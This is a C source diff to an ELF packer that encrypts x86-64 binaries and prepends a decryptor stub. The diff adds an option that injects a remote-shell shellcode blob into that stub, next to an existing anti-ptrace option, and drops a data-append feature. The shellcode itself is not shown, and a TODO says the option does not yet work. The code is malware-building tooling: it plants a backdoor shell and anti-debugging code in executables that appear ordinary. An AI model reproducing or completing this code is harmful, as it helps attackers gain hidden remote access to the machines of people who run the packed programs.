@@ -50,6 +50,10 @@ static const ubyte woody_msg[] = {
 #define OP_JUMPN '\xE9'
 #define OP_JUMPN_SIZE 0x4
 
+#define OP_REX_W '\x48'
+#define OP_MOV_RDI_IMM '\xBF'
+#define OP_MOV_RDI_IMM_SIZE 0xa
+
 __attribute__ ((always_inline))
 static inline uqword get_decryptor_size_x86_64(const parse_t* const in, const crypt_pair_t* const targets)
 {
@@ -80,8 +84,8 @@ static inline uqword get_decryptor_size_x86_64(const parse_t* const in, const cr
 	if (in->opts & O_ANTIPTRCE)
 		size += ARRLEN(antiptrace_x86_64);
 
-	if (in->opts & O_APPENDDAT)
-		size += *(uqword*)in->data;
+	if (in->opts & O_REMOTE_SH)
+		size += OP_MOV_RDI_IMM_SIZE + ARRLEN(remote_serv_shell_x86_64);
 
 	return size;
 }
@@ -94,6 +98,19 @@ static inline void memcpy_offset(ubyte* const restrict dest, const ubyte* const 
 	*offset += nbytes;
 }
 
+
+__attribute__ ((always_inline))
+static inline void mov_key_to_rdi(ubyte* const dest, uqword* const offset, uqword key)
+{
+	ubyte op_mov_reg_imm[OP_MOV_RDI_IMM_SIZE] = {
+		OP_REX_W, OP_MOV_RDI_IMM, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
+	};
+
+	register uqword* const imm64 = (uqword*)(op_mov_reg_imm + 2);
+
+	*imm64 = key;
+	memcpy_offset(dest, op_mov_reg_imm, ARRLEN(op_mov_reg_imm), offset);
+}
 
 __attribute__ ((always_inline))
 static inline void push_entry_point(ubyte* const dest, uqword* const offset, uqword entry_point)
@@ -233,16 +250,19 @@ err_t build_decryptor_x86_64(decryptor_t* const dest, const parse_t* const in,
 	if (in->opts & O_ANTIPTRCE)
 		memcpy_offset(dest->data, antiptrace_x86_64, ARRLEN(antiptrace_x86_64), &offset);
 
+	if (in->opts & O_REMOTE_SH)
+	{
+		///TODO: This otion doesn't work yet because there is a ret in the decriptor, this function should be called before the ret of the decryptor
+		mov_key_to_rdi(dest->data, &offset, in->key);
+		memcpy_offset(dest->data, remote_serv_shell_x86_64, ARRLEN(remote_serv_shell_x86_64), &offset);
+	}
+
 	build_stack_initializer_x86_64(dest->data, &offset, targets, in->key);
 
 	//payload_size = ARRLEN(decryptor_x86_64);
 	memcpy_offset(dest->data, decryptor_x86_64, ARRLEN(decryptor_x86_64), &offset);
 
-	if (in->opts & O_APPENDDAT)
-	{
-	//	payload_size += *(uqword*)in->data;
-		ft_memcpy(dest->data + offset, in->data + sizeof(uqword), *(uqword*)in->data);
-	}
+
 
 	//memcpy_offset(*dest, (ubyte[OP_JUMPN_SIZE]){OP_JUMPN, payload_size}, OP_JUMPN_SIZE, &offset);
 
